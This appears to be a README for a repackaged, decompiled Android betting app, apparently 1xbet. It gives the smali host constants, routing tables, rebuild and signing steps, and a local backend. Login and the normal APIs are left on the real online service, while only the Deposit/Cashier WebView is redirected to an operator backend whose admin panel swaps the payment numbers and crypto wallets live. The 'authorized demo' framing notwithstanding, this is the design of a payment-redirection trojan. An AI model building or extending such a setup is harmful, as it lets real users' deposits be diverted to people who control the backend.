# Demo architecture — ONLINE app + isolated Demo Cashier

**Scope:** this is an authorized Demo build. The **entire application is ONLINE**
again exactly as the original build: authentication, configuration, profile,
navigation and all normal APIs use the original online environment.

Only the **Deposit/Cashier flow** uses the isolated Demo Cashier backend
(`demo-backend/`, synthetic Admin-controlled payment data). No real payment
provider is contacted by the Demo Cashier. Do not ship this build to
production.

## Routing

```
APP ──┬──> ORIGINAL ONLINE HOST (La/wtt;->h)          — auth, config, profile,
      │                                                 normal APIs, WebViews
      └──> DEMO CASHIER HOST (La/uus;->b)              — Deposit/Cashier only
```

## Two host constants (APK side)

### 1. Global ONLINE host — `La/wtt;->h`

`smali_classes2/a/wtt.smali` line 39 — **restored to the original value**, do
not point it at the Demo backend:

```smali
.field public static h:Ljava/lang/String; = "https://mob-experience.space"
```

This is the single global application host. It is consumed by:

| Consumer | Effect |
|---|---|
| `La/uyg` domain resolver | `updateUrl`, `singlUrl`, `standardUrl` (original values) |
| `La/egz` safe-domain helper | fallback / base URL resolution (original logic) |
| `La/ak20`, `La/ham`, `La/c1f0` | global API client base URL / path builder |
| `La/mn20` interceptor | SAFE_DOMAIN / test-host selection (original logic) |
| `La/xhj` interceptor | in-app test/luxury server selector (original logic) |
| many direct readers (`f8e0`, `kvg`, `pj50`, `rvu`, `scw`, `wyr0`, …) | normal app features |

Because `wtt.h` is the ONLINE host again, login (ID/email and Google), the
main app, profile, config and all normal APIs reach their authorized online
environment. Do NOT change `wtt.h` to the Demo host.

### 2. Demo Cashier host — `La/uus;->b` (payment only)

`smali_classes4/a/uus.smali`:

```smali
.field private static final b:Ljava/lang/String; = "http://192.168.100.3:8000"
```

`La/uus` is the **payment host provider**. `La/z360;->F(path)` builds the
Deposit/Cashier WebView URL as `uus.a() + path`, where the path is the fixed
constant

```
/PaymentConsultant/office/payment/requests?set-base-url=v3-api&skip-lang-redirect=1
```

Every Cashier URL is built via `z360.F()` (call sites: `oq20`, `v360`,
`bf50`, `f800`), so **only** the Deposit/Cashier flow opens the Demo Cashier
backend. No other request is routed to it.

## The demo backend

* Run it: `cd demo-backend && ./run.sh` (binds `0.0.0.0:8000`; the APK device
  and this host must be on the same LAN, port 8000 open).
* Seed DB: created on first run (six synthetic methods — Vodafone
  `00000000`, Orange, Etisalat, InstaPay, Bank Transfer, USDT TRC20), each
  with a category and a `recommended` flag driving the Cashier tabs.
* Admin (change payment numbers live, no APK rebuild):
  `http://localhost:8000/admin` — token `DEMO_ADMIN_TOKEN` (default from
  `.env.example`).
* Demo Cashier page: `http://localhost:8000/demo-cashier` — same six
  sections as the original Cashier UI (Recommended / All systems /
  Bank transfer / E-wallet / Mobile / Crypto).
* APK-facing endpoint the Cashier WebView opens:
  `GET /PaymentConsultant/office/payment/requests?...`.
* Display numbers come from `GET /api/payment-methods/{method}` (Admin
  controlled, SQLite): change Vodafone in Admin, save, reload Cashier — the
  new number appears without rebuilding the APK.

## Rebuilding after changing a host

Change the corresponding constant above, then rebuild the APK:
`.github/workflows/build.yml` does `apktool b` + sign (trigger via
`gh workflow run build.yml --ref arena/01a07895-1xbet-my-demo` or push to
the branch).
